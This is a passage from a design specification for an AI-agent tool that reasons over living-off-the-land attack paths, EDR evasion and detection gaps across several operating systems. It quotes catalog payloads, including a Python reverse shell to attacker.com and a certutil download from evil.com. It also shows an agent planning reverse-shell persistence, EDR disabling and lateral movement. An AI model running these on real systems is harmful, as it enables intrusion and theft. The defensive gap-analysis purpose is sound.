  last_updated     : string (timestamp)
```

---

## 10. Platform Modules

### 10.1 Linux Module

**Enumeration inputs:**
- `sudo -l` output (sudoers analysis)
- `find / -perm -4000 -type f` (SUID binaries)
- `find / -perm -2000 -type f` (SGID binaries)
- `getcap -r /` (Linux capabilities)
- `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/` (cron jobs)
- `cat /etc/passwd`, writable home directories
- Kernel version (`uname -r`) for kernel exploit cross-reference
- Installed package list
- Running services (`systemctl list-units`)
- Writable directories in PATH
- Docker socket accessibility (`/var/run/docker.sock`)
- Environment variables with secrets

**Technique sources:** GTFOBins (478 binaries, 11 functions, 4 contexts)

**Linux-specific chain patterns:**
- SUID binary -> root shell -> cron persistence
- Capability abuse -> setuid(0) -> root
- Writable PATH directory -> binary hijacking -> escalation
- Docker socket -> container escape -> root
- Writable /etc/passwd -> add root user -> persistence
- Kernel exploit (dirty pipe, etc.) -> root (cross-ref with CVE Intelligence MCP)

### 10.2 Windows Module

**Enumeration inputs:**
- `whoami /all` (privileges, groups, SIDs)
- `icacls` on sensitive directories
- `schtasks /query /fo CSV` (scheduled tasks)
- `wmic service list` (services with writable paths)
- Registry permissions (AlwaysInstallElevated, AutoRun, etc.)
- Unquoted service paths
- DLL search order hijacking opportunities
- Loaded drivers (`driverquery /v`)
- Installed software
- PowerShell execution policy
- AMSI/CLM status
- AppLocker/WDAC policy

**Technique sources:** LOLBAS (200+ entries), LOLDrivers (615 drivers), WADComs, MalAPI, LOLGlobs, LOLRMM, LOFLCABs, Persistence Info

**Windows-specific chain patterns:**
- Unquoted service path -> binary planting -> SYSTEM
- AlwaysInstallElevated -> MSI payload -> SYSTEM
- DLL sideloading -> code execution as trusted process -> bypass AppLocker
- BYOVD (LOLDrivers) -> load vulnerable driver -> disable EDR -> proceed undetected
- Certutil decode -> staged payload -> PowerShell execution -> C2
- WMI persistence -> survive reboot -> beacon
- PrintSpoofer/Potato -> SeImpersonate -> SYSTEM (if service account)

### 10.3 macOS Module

**Enumeration inputs:**
- `sudo -l` output
- SUID binaries
- TCC database permissions
- LaunchAgents/LaunchDaemons
- Accessibility permissions
- Running XPC services
- System Integrity Protection (SIP) status
- Gatekeeper status
- Installed brew packages

**Technique sources:** LOOBins, GTFOBins (overlapping Unix binaries), PyLOOBins SDK

**macOS-specific chain patterns:**
- osascript -> AppleScript execution -> user-level persistence
- Remote Apple Events (eppc://) -> lateral movement to other Macs
- LaunchAgent plist -> persistence across logins
- Spotlight metadata (mdls/mdfind) -> data discovery and staging
- nscurl -> download from external (bypasses some controls)
- JXA (JavaScript for Automation) -> fileless execution

### 10.4 ESXi Module

**Enumeration inputs:**
- ESXi version
- Available binaries (vim-cmd, esxcli, python, etc.)
- Datastore permissions
- SSH access status

**Technique sources:** LOLESXi catalog

**ESXi-specific chain patterns:**
- vim-cmd -> VM manipulation -> data theft
- esxcli -> firewall manipulation -> open ports
- Python on ESXi -> custom payload execution
- Ransomware operators' known ESXi playbooks

---

## 11. MITRE ATT&CK Integration

### 11.1 Technique Mapping

Every LOL technique in the unified knowledge base is tagged with its ATT&CK technique ID(s). The mapping covers:

**Execution:** T1059 (Command and Scripting Interpreter), T1059.001 (PowerShell), T1059.003 (Windows Command Shell), T1059.004 (Unix Shell), T1059.006 (Python), T1059.007 (JavaScript), T1047 (WMI), T1218 (System Binary Proxy Execution, with sub-techniques for Regsvr32, Rundll32, MSHTA, InstallUtil, etc.)

**Persistence:** T1053 (Scheduled Task/Job), T1543 (Create or Modify System Process), T1547 (Boot or Logon Autostart Execution), T1546 (Event Triggered Execution), T1574 (Hijack Execution Flow)

**Privilege Escalation:** T1548 (Abuse Elevation Control Mechanism, with sub-techniques for SUID/SGID, Sudo Caching, bypass UAC), T1068 (Exploitation for Privilege Escalation)

**Defense Evasion:** T1036 (Masquerading), T1027 (Obfuscated Files), T1055 (Process Injection), T1140 (Deobfuscate/Decode), T1202 (Indirect Command Execution), T1564 (Hide Artifacts)

**Credential Access:** T1003 (OS Credential Dumping), T1552 (Unsecured Credentials), T1558 (Steal Kerberos Tickets)

**Discovery:** T1082 (System Information Discovery), T1083 (File and Directory Discovery), T1087 (Account Discovery)

**Lateral Movement:** T1021 (Remote Services), T1570 (Lateral Tool Transfer)

**Exfiltration:** T1048 (Exfiltration Over Alternative Protocol), T1567 (Exfiltration Over Web Service)

### 11.2 ATT&CK Navigator Layer Export

The MCP can export an ATT&CK Navigator layer (.json) showing:
- Which techniques are available in the current environment (green)
- Which techniques were used in the chosen attack plan (red)
- Which techniques have detection gaps (yellow)

---

## 12. Agent Reasoning Scenarios

### Scenario 1: Linux Web Server Post-Exploitation

```
Agent: enumerate_host(platform="linux", enumeration_data=<paste of sudo -l, SUID, getcap, cron, etc.>)

Agent reasoning:
  "I have 4 direct escalation paths to root. The fastest is sudo find (one command,
   certainty 100%, stealth score 2). After getting root, /etc/cron.d/ is writable
   and cron is running, so I can drop a reverse shell cron job for persistence.
   config.php contains MySQL credentials, which could give me lateral movement
   to the database server at 10.10.10.5. No EDR detected, so stealth is less
   critical. Let me build the full attack plan."

Agent: build_attack_plan(
  objectives=["escalate", "persist", "lateral_move", "exfil"],
  stealth_priority=false
)

Result: 4-phase plan with specific commands for each step.
```

### Scenario 2: Windows Domain Host with EDR

```
Agent: enumerate_host(platform="windows", enumeration_data=<whoami /priv, schtasks, drivers, etc.>)

Agent reasoning:
  "CrowdStrike Falcon is running. My usual certutil download will be caught.
   Let me check defense evasion options first."

Agent: find_defense_evasion(edr_product="crowdstrike")

Agent reasoning:
  "I found a vulnerable driver (dbutil_2_3.sys, LOLDrivers ID xxx) already loaded.
   This is a known BYOVD candidate that can disable EDR via kernel callback removal.
   But loading a custom driver exploit is noisy. Let me check if there's a stealthier
   path."

Agent: find_escalation_paths(stealth_priority=true)

Agent reasoning:
  "The stealthiest path is an unquoted service path for 'Vendor Update Service'
   running as SYSTEM. I can plant a binary in the gap. Stealth score 2 because
   it looks like a legitimate service restart. After SYSTEM, I can use LOFLCABs
   to move laterally via WinRM to other domain hosts."
```

### Scenario 3: Blue Team Detection Gap Assessment

```
Analyst: "What LOL techniques are available on our standard Windows 11 build,
          and which ones do our current Sigma rules NOT cover?"

Agent: enumerate_host(platform="windows", enumeration_data=<standard build inventory>)
Agent: assess_detection_gaps(deployed_rules=["sigma-rule-id-1", "sigma-rule-id-2", ...])

Result:
  "Your standard build has 147 applicable LOL techniques.
   Your deployed Sigma rules cover 89 of them (60.5%).
   58 techniques have no detection coverage.
   Top 5 priority gaps:
   1. BITSAdmin file transfer (T1197) -- commonly used, no rule
   2. Forfiles command execution (T1202) -- rarely monitored
   3. Esentutl.exe file copy (T1003.003) -- can copy locked files like NTDS.dit
   4. Replace.exe file copy -- can bypass file locks, no existing rule
   5. Mavinject.exe DLL injection (T1055.001) -- signed Microsoft binary"
```

---

## 13. CyberStrike Integration

### 13.1 Position in the CyberStrike Ecosystem

```
Attack Surface Layer:
  OSINT MCP            -> external reconnaissance
  Fingerprint MCP      -> technology identification
  DNS Security MCP     -> DNS-based intel
  Attack Surface MCP   -> asset discovery

Vulnerability Layer:
  CVE Intelligence MCP -> vulnerability identification
  Cloud Audit MCP      -> cloud misconfiguration
  Supply Chain MCP     -> dependency risk
  npm Security MCP     -> package-specific risk

Attack Path Layer:
  Cloud Attack Path MCP -> identity attack paths in cloud
  LOL MCP              -> binary attack paths on hosts     <-- THIS
  
Post-Exploitation Layer:
  Darknet MCP          -> leaked credential correlation
  Steganography MCP    -> hidden data detection
```

### 13.2 Integration with Other MCP Servers

| MCP Server | Integration |
|---|---|
| **Cloud Attack Path MCP** | LOL MCP finds host-level escalation; Cloud Attack Path finds cloud-level escalation. Chained: compromised EC2 instance -> LOL MCP finds root on box -> Cloud Attack Path finds instance role leads to S3 crown jewels. |
| **CVE Intelligence MCP** | Cross-reference kernel version with known kernel exploits (dirty pipe, etc.) as alternative escalation paths alongside LOL techniques. |
| **Fingerprint MCP** | Remote fingerprinting identifies target OS, services, technologies; LOL MCP then predicts which LOL techniques are likely available without direct enumeration. |
| **OSINT MCP** | Discovered services (exposed SSH, RDP, WinRM) feed lateral movement planning. |
| **Darknet MCP** | Leaked credentials found in breach data can bypass the escalation step entirely. |
| **Cloud Audit MCP** | Cloud misconfigurations (IMDS v1, overprivileged instance role) become additional edges in the host-level attack graph. |

### 13.3 Agent Flow: Full Engagement

```
1. OSINT MCP discovers target hosts
2. Fingerprint MCP identifies OS, services, technologies
3. CVE Intelligence MCP finds applicable vulnerabilities
4. Agent gains initial access (exploit or credential)
5. LOL MCP enumerate_host() -> builds environment model
6. LOL MCP find_escalation_paths() -> finds root/SYSTEM paths
7. LOL MCP find_persistence_paths() -> establishes persistence
8. LOL MCP find_lateral_movement() -> discovers pivot targets
9. Cloud Attack Path MCP -> maps cloud identity paths from compromised host
10. LOL MCP build_attack_plan() -> generates complete engagement plan
11. Agent executes plan with CyberStrike's tool-calling framework
```

---

## 14. Differentiation from Existing Tools

| Capability | GTFOBins (web) | gtfo CLI | LOLBAS (web) | Unit-259 lolbins PS | livingofftheland.dev | LOL MCP |
|---|---|---|---|---|---|---|
| Unified cross-catalog | no (Linux only) | no | no (Windows only) | no (Windows only) | Windows + Linux | **yes (19 catalogs)** |
| Environment-aware | no | no | no | Test-LOLBinPaths (existence only) | no | **yes (full context)** |
| Attack chain reasoning | no | no | no | no | no | **yes** |
| Stealth scoring | no | no | no | no | no | **yes** |
| Detection surface | no | no | no | Get-LOLBinDetection | partial | **yes (Sigma, Sysmon, EDR)** |
| Multi-step paths | no | no | no | no | no | **yes** |
| Blue team gap analysis | no | no | no | no | no | **yes** |
| Payload generation | no | no | no | Get-LOLBinUsage | yes (payload builder) | **yes (env-customized)** |
| ATT&CK Navigator export | no | no | LOLBAS has ATT&CK map | no | yes (ATT&CK mapping) | **yes (dynamic)** |
| Driver scanning (BYOVD) | no | no | no | no | no | **yes (LOLDrivers)** |
| macOS coverage | no | no | no | no | no | **yes (LOOBins)** |
| ESXi coverage | no | no | no | no | no | **yes (LOLESXi)** |
| CI/CD coverage | no | no | no | no | no | **yes (LOTP)** |
| MCP / agent-native | no | no | no | no | no | **yes** |
| AI reasoning layer | no | no | no | no | no | **yes** |

The single sentence differentiator: **every existing tool is a lookup table; the LOL MCP is a reasoning engine.**

---

## 15. Implementation Roadmap

### Phase 1: Linux Core (Weeks 1-3)
- GTFOBins catalog ingestion and normalization
- Linux enumeration parser (sudo -l, SUID, capabilities, cron, writable paths)
- Environment model builder
- Basic path-finding (single-step escalation)
- MCP tools: `enumerate_host`, `find_escalation_paths`, `lookup_binary`
- **Deliverable:** "Give me your sudo -l and SUID list, I'll tell you how to get root"

### Phase 2: Chain Reasoning & Stealth (Weeks 4-5)
- Multi-step chain discovery algorithm
- Stealth scoring model
- Detection surface analysis (Sigma rule cross-reference)
- Persistence and exfiltration path-finding
- MCP tools: `find_persistence_paths`, `find_exfiltration_paths`, `generate_payload`
- **Deliverable:** "Here's a 3-step chain: escalate via SUID vim, persist via cron, exfil via curl. Stealth score 3/5."

### Phase 3: Windows Module (Weeks 6-8)
- LOLBAS catalog ingestion
- LOLDrivers catalog ingestion (BYOVD scanning)
- WADComs, MalAPI, LOLGlobs, Persistence Info ingestion
- Windows enumeration parser (whoami, schtasks, drivers, services, registry)
- Windows-specific chain patterns (DLL sideload, unquoted service path, BYOVD)
- MCP tools: `scan_drivers`, `find_defense_evasion`
- **Deliverable:** Full Windows post-exploitation reasoning with BYOVD and EDR evasion

### Phase 4: macOS + ESXi + Extended Catalogs (Weeks 9-10)
- LOOBins catalog ingestion (PyLOOBins SDK)
- LOLESXi catalog ingestion
- LOTS, LOLRMM, LOFLCABs, LOLC2, LOLEXFIL, LoTWH, LOTTunnels, LoLCerts, LOTP ingestion
- macOS enumeration parser
- ESXi enumeration parser
- Cross-platform binary correlation (python on Linux = python3 on macOS = python.exe on Windows)
- MCP tools: `update_knowledge_base`
- **Deliverable:** True cross-platform coverage (19 catalogs unified)

### Phase 5: Blue Team & ATT&CK (Weeks 11-12)
- ATT&CK Navigator layer export
- Detection gap assessment engine
- Sigma rule recommendation engine
- Complete attack plan builder
- LOLBins CTI-Driven overlay (which APT used which technique)
- MCP tools: `assess_detection_gaps`, `build_attack_plan`
- CyberStrike integration (agent flow, tool chaining with other MCPs)
- **Deliverable:** Purple team tool: offensive paths + defensive gap analysis

---

## 16. Appendix A: LOL Catalog Data Formats

### A.1 GTFOBins Format (Jekyll Markdown)

Each binary is a markdown file (`_gtfobins/<binary>.md`) with YAML frontmatter:

```yaml
---
description: >
  Python is a general purpose scripting language.
functions:
  shell:
    - description: It can be used to break out from restricted environments by spawning an interactive system shell.
      code: python -c 'import os; os.system("/bin/sh")'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the receiving end to catch the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
  sudo:
    - code: sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  suid:
    - code: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  capabilities:
    - code: |
        cp $(which python) .
        sudo setcap cap_setuid+ep python
        ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
---
```

### A.2 LOLBAS JSON API Format

Single-file JSON at `https://lolbas-project.github.io/api/lolbas.json`:

```json
[
  {
    "Name": "Certutil.exe",
    "Description": "Certificate utility",
    "Author": "...",
    "Created": "2018-05-25",
    "Commands": [
      {
        "Command": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe",
        "Description": "Download and save a file from a web server",
        "Usecase": "Download file from Internet",
        "Category": "Download",
        "Privileges": "User",
        "MitreID": "T1105",
        "OperatingSystem": "Windows Vista+"
      }
    ],
    "Full_Path": [
      {"Path": "C:\\Windows\\System32\\certutil.exe"},
      {"Path": "C:\\Windows\\SysWOW64\\certutil.exe"}
    ],
    "Code_Sample": [],
    "Detection": [
      {"IOC": "Certutil.exe creating new files on disk"},
      {"IOC": "Certutil.exe making network connections"}
    ],
    "Resources": ["https://..."],
    "Acknowledgement": [{"Person": "...", "Handle": "..."}]
  }
]
```

### A.3 LOLDrivers JSON API Format

```json
[
  {
    "Id": "xxx-xxx-xxx",
    "Author": "...",
    "Created": "2023-05-06",
    "MitreID": "T1068",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Commands": {
      "Command": "sc.exe create xxx binPath=...",
      "Description": "...",
      "Usecase": "Elevate privileges, disable EDR",
      "Privileges": "kernel",
      "OperatingSystem": "Windows 10+"
    },
    "KnownVulnerableSamples": [
      {
        "Filename": "dbutil_2_3.sys",
        "MD5": "...",
        "SHA1": "...",
        "SHA256": "...",
        "Signature": "Dell Inc.",
        "Date": "...",
        "Description": "...",
        "MachineType": "AMD64"
      }
    ],
    "Tags": ["BYOVD", "EDR killer", "process killer"],
    "Detection": [
      {"type": "sigma", "value": "..."},
      {"type": "yara_signature", "value": "..."},
      {"type": "sysmon_hash_detect", "value": "..."}
    ]
  }
]
```

### A.4 LOOBins Format (via PyLOOBins)

```python
from pyloobins import LOOBins

loobins = LOOBins()
for loobin in loobins.get_all():
    print(f"Binary: {loobin.name}")
    print(f"ATT&CK: {loobin.attck_id}")
    for example in loobin.examples:
        print(f"  Use case: {example.description}")
        print(f"  Command: {example.command}")
        print(f"  Tactic: {example.tactic}")
```

---

## 17. Appendix B: Privilege Escalation Decision Trees

### B.1 Linux Escalation Decision Tree

```
START: current user is non-root

├── Check: sudo -l
│   ├── Has NOPASSWD entries?
│   │   ├── Binary is in GTFOBins sudo category?
│   │   │   └── YES -> Direct root (certainty: 100%, stealth: 2)
│   │   └── Binary can write files?
│   │       └── YES -> Write to /etc/sudoers or /etc/passwd (certainty: 90%, stealth: 3)
│   └── Has password-required entries?
│       └── Do we have the password? -> same as above
│
├── Check: SUID binaries
│   ├── Binary is in GTFOBins SUID category?
│   │   └── YES -> Root via SUID (certainty: 100%, stealth: 3)
│   └── Binary is custom/unusual?
│       └── Analyze for command injection, file read/write
│
├── Check: Linux capabilities
│   ├── cap_setuid?
│   │   └── YES -> Direct root via setuid(0) (certainty: 100%, stealth: 2)
│   ├── cap_dac_override?
│   │   └── YES -> Read/write any file (certainty: 100%, stealth: 2)
│   └── cap_sys_admin?
│       └── YES -> Mount/namespace abuse (certainty: 80%, stealth: 3)
│
├── Check: Writable sensitive paths
│   ├── /etc/passwd writable?
│   │   └── YES -> Add root user (certainty: 100%, stealth: 4)
│   ├── /etc/cron.d/ or /var/spool/cron/ writable?
│   │   └── YES -> Cron persistence as root (certainty: 95%, stealth: 3)
│   ├── Writable directory in PATH (before system dirs)?
│   │   └── YES -> Binary hijacking (certainty: 80%, stealth: 2)
│   └── /etc/ld.so.preload writable?
│       └── YES -> Shared library injection (certainty: 90%, stealth: 3)
│
├── Check: Docker socket accessible?
│   └── /var/run/docker.sock accessible?
│       └── YES -> Container escape to root (certainty: 100%, stealth: 3)
│
├── Check: Kernel version
│   └── Cross-reference CVE Intelligence MCP
│       └── Known kernel exploit available? (dirty pipe, dirty cow, etc.)
│           └── YES -> Kernel exploit (certainty: 70%, stealth: 4)
│
└── Check: NFS, wildcard injection, cron misconfig, etc.
    └── Enumerate and test
```

### B.2 Windows Escalation Decision Tree

```
START: current user is non-admin

├── Check: Token privileges
│   ├── SeImpersonatePrivilege?
│   │   └── YES -> Potato family (PrintSpoofer, GodPotato) -> SYSTEM
│   ├── SeBackupPrivilege?
│   │   └── YES -> Read SAM/SYSTEM hives -> credential extraction
│   ├── SeRestorePrivilege?
│   │   └── YES -> Write to protected locations -> DLL hijack
│   └── SeDebugPrivilege?
│       └── YES -> Process injection into SYSTEM process
│
├── Check: Unquoted service paths
│   └── Service running as SYSTEM with unquoted path and writable gap?
│       └── YES -> Binary planting -> SYSTEM (stealth: 2)
│
├── Check: Writable service binaries
│   └── Can overwrite a service .exe running as SYSTEM?
│       └── YES -> Replace binary, restart service -> SYSTEM
│
├── Check: AlwaysInstallElevated
│   └── Registry key enabled for both HKLM and HKCU?
│       └── YES -> Craft MSI -> SYSTEM (stealth: 3)
│
├── Check: DLL search order hijacking
│   └── Privileged application loading DLL from writable path?
│       └── YES -> Plant malicious DLL (stealth: 2)
│
├── Check: Scheduled tasks
│   └── Task running as SYSTEM with writable script/binary?
│       └── YES -> Modify task payload -> SYSTEM at next run
│
├── Check: Loaded drivers (LOLDrivers)
│   └── Vulnerable driver already loaded?
│       └── YES -> BYOVD exploit -> kernel access -> disable EDR -> SYSTEM
│
├── Check: LOLBAS techniques
│   ├── Can download (certutil, BITSAdmin, curl)?
│   ├── Can execute (rundll32, regsvr32, mshta, InstallUtil)?
│   ├── Can bypass AppLocker/AMSI?
│   └── Chain download + execute + bypass for staged escalation
│
└── Check: Cached credentials
    └── Stored credentials in Credential Manager, registry, or config files?
        └── YES -> Credential reuse for lateral movement or local escalation
```

---

**End of Specification**

*This document is a living specification. It will be updated as the LOL ecosystem evolves and new catalogs emerge.*

*Copyright 2026 AUM Labs LLC. All rights reserved.*
